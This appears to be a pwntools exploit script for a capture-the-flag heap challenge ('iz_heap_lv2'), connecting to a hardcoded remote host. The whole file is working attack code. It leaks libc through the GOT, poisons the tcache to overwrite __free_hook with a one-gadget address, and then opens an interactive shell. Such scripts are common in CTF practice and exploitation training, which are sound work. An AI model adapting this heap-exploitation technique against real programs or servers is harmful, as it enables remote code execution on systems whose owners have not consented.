#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

BIN_NAME     = "./iz_heap_lv2"
LIBC_NAME    = "./libc.so.6"

HOST         = "165.22.110.249"
PORT         = 4444

def add(size, data):
    p.sendlineafter('Choice:', '1')
    p.sendlineafter('size:', str(size))
    p.sendafter('data:', data)

def edit(index,  data=None):
    p.sendlineafter('Choice:', '2')
    p.sendlineafter('index:', str(index))
    if data:
        p.sendafter('data:', data)

def delete(index):
    p.sendlineafter('Choice:', '3')
    p.sendlineafter('index:', str(index))

def show(index):
    p.sendlineafter('Choice:', '4')
    p.sendlineafter('index:', str(index))
    p.recvuntil('Data: ')
    return p.recvuntil('\n', drop=True)

def exploit(p):

    add(e.got['printf'], 'AAAAAAAA')
    printf_got = u64(show(20).ljust(8,'\x00'))

    libc_base = printf_got - libc.sym['printf']
    free_hook = libc_base + libc.sym['__free_hook']
    one_shot  = libc_base + 0x4f322

    log.info("libc        @ " + hex(libc_base))
    log.info("one_shot    @ " + hex(one_shot))
    log.info("__free_hook @ " + hex(free_hook))

    delete(0)

    add(0x602048, 'AAAAAAAA')
    add(127, 'BBBBBBBB')
    add(127, 'CCCCCCCC')

    chunk_ptr = u64(show(20).ljust(8,'\x00'))

    delete(0)

    add(chunk_ptr, 'DDDDDDDD')

    delete(20)

    delete(2)
    delete(1)

    add(127, p64(free_hook))
    add(127, '1')
    add(127, '2')

    add(127, p64(one_shot))

    delete(0)

    p.interactive()

if __name__ == "__main__":

    e = ELF(BIN_NAME)

    libc = ELF(LIBC_NAME)
    env  = dict(LD_PRELOAD = LIBC_NAME)

    p = remote(HOST, PORT)
    # p = process(BIN_NAME, env=env)

    exploit(p)
